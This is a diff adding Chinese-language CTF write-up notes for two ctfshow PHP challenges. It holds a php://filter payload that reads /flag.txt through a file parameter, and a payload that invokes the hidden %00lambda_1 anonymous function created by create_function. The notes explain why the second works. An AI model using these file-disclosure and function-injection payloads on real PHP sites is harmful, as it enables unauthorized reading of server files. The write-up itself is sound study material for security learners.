@@ -95,3 +95,33 @@ for i in a:
 ```
 
 对数据a需手动修正
+
+## web784
+
+非预期了
+
+``payload：?file=php://filter/convert.base64-encode/resource=/flag.txt``
+
+## web787(匿名函数)
+
+```php
+<?php
+
+error_reporting(0);
+/*创建匿名函数，$key为%00lambda_%d*/
+$key = create_function("","die(`cat /flag.txt`);");
+/*生成32位随机数*/
+$hash = bin2hex(openssl_random_pseudo_bytes(32));
+eval("function ctfshow_$hash(){"
+    ."global \$key;"
+    ."\$key();"
+    ."}");
+if(isset($_GET['func_name'])){
+    $_GET["func_name"]();
+    die();
+}
+show_source(__FILE__);
+```
+
+此题关键点在于create_function，这个函数创建了一个匿名函数，我们想要拿到flag就只有调用$key或者ctfshow_$hash()，如果去碰撞这个hash显然不现实，这里如果打印$key会发现其实它返回``%00lambda_%d``，%d是从1开始逐增的整数，也就是说在最开始的时候``$key=%00lambda_1``，我们每一次访问页面后面的数字都会增加，``%00lambda_2、%00lambda_3``等等，所以这个题只有一次成功机会，在环境刚开时打入payload：``?func_name=%00lambda_1``
+
